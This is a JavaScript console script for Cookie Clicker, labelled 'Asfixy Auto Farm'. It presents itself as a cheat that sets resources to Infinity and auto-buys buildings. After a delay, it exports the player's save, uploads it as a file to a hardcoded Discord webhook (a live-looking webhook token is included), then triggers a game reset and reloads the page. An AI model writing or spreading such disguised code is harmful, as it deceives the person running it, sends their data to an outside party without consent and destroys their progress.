function hi() {
  console.error("Asfixy Auto Farm");
  Game.Ascend(0x1);

  setTimeout(function () {
    setInterval(() => {
      Game.lumps = Infinity;
      Game.cookies = Infinity;
      Game.prestige = Infinity;
      Game.ObjectsById[0x0].levelUp();
    }, 0x0);

    for (let i = 1; i <= 0x13; i++) {
      setInterval(() => {
        if (Game.ObjectsById.hasOwnProperty(i)) {
          Game.ObjectsById[i].levelUp();
        }
        Game.SetAllUpgrades(0x1);
        Game.storeBulkButton(4);
        Game.RuinTheFun(0x1);
      }, 0x0);
    }

    setInterval(() => {
      for (let i = 0x0; i <= 0x13; i++) {
        const product = document.querySelector("#product" + i);
        if (product) {
          product.click();
        }
      }
    }, 0x0);
  }, 0x1388);

  setTimeout(function () {
    Game.Reincarnate(0x1);
  }, 0x1770);

  setTimeout(function () {
    Game.toSave = true;
    setTimeout(function () {
      Game.ExportSave();
      const textareaPrompt = document.querySelector("#textareaPrompt");
      const saveData = textareaPrompt.value;

      const blob = new Blob([saveData], { type: 'text/plain' });
      const file = new File([blob], 'saveData.txt', { type: 'text/plain' });

      const formData = new FormData();
      formData.append('file', file);

      const webhookUrl = "https://discord.com/api/webhooks/1294455119202746399/1zczXFGP4gshRM0lK8pxyKr8ep0dUnl-sWewp_d2Gg6v8IPyR2Gd5six0JGA-Eu6ASon"; // Replace with your Discord webhook URL
      
      fetch(webhookUrl, {
        method: "POST",
        body: formData,
      })
      .then(() => {
        setTimeout(function () {
          Game.SesameReset();
        }, 3000);

        setTimeout(function () {
          Game.toSave = true;
          location.reload();
        }, 1000);
      });
    }, 1000);
  }, 20000);
}

hi();
